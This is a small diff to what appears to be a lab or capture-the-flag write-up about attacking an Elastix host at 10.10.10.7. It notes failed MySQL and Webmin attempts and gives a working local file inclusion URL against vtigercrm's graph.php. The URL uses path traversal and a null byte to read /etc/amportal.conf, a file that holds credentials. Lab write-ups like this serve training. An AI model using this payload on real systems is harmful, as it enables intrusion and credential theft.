@@ -93,7 +93,7 @@ not recursive
 * Failed to access MySQL Server
 * Not vulnerable to [Webmin Exploit](https://raw.githubusercontent.com/jas502n/CVE-2019-15107/master/CVE_2019_15107.py)
 
-* Successfully exploit LFI vulnerability 
+* Successfully exploit LFI vulnerability of elastix
 ```
 https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
 ```
